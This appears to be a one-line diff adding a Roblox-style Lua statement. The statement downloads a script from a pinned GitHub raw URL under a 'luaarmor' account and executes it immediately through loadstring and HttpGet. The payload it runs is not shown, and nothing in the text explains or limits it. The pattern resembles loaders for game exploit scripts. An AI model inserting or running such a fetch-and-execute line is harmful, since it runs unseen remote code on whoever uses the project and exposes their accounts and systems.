@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luaarmor/lua.armor/66c4d6c24e8d0783e8137f6111a03eaf355a1103/My"))()
